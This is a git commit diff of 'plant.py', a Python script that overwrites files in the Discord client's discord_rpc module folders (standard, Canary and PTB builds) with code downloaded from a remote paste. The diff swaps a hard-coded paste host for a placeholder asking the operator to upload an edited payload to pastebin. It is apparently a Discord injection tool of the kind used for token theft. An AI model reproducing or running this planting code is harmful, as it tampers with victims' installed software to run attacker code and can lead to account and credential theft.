33f53b6e3bcaa7b0a75fdb030b9b8c2522977188
9s6 <72808522+9s6@users.noreply.github.com>
2021-01-31 00:24:25 +0100

    Update plant.py

--- plant.py
+++ plant.py
@@ -2,7 +2,7 @@ import requests, os
 
 def normal():
     f = open(f"C://Users//{str(os.getenv('username'))}//AppData//Roaming//discord//0.0.309//modules//discord_rpc//file.py", "w")
-    f.write(requests.get("https://dox.cythosa.xyz/paste.php?raw&id=9").text)
+    f.write(requests.get("Upload the edited text from plant.py to pastebin and put the raw link here").text)
     f.close()
 
     e = open(f"C://Users//{str(os.getenv('username'))}//AppData//Roaming//discord//0.0.309//modules//discord_rpc//index.js", "w")
@@ -23,7 +23,7 @@ def normal():
 
 def canary():
     f = open(f"C:/Users/{str(os.getenv('username'))}/AppData/Local/DiscordCanary/app-1.0.21/modules/discord_rpc-10/discord_rpc/file.py", "w")
-    f.write(requests.get("https://dox.cythosa.xyz/paste.php?raw&id=9").text)
+    f.write(requests.get("Upload the edited text from plant.py to pastebin and put the raw link here").text)
     f.close()
 
     e = open(f"C:/Users/{str(os.getenv('username'))}/AppData/Local/DiscordCanary/app-1.0.21/modules/discord_rpc-10/discord_rpc/index.js", "w")
@@ -44,7 +44,7 @@ def canary():
 
 def ptb():
     f = open(f"C:/Users/{os.getenv('username')}/AppData/Local/DiscordPTB/app-1.0.1001/modules/discord_rpc-1/discord_rpc/file.py", "w")
-    f.write(requests.get("https://dox.cythosa.xyz/paste.php?raw&id=9").text)
+    f.write(requests.get("Upload the edited text from plant.py to pastebin and put the raw link here").text)
     f.close()
 
     e = open(f"C:/Users/{os.getenv('username')}/AppData/Local/DiscordPTB/app-1.0.1001/modules/discord_rpc-1/discord_rpc/index.js", "w")
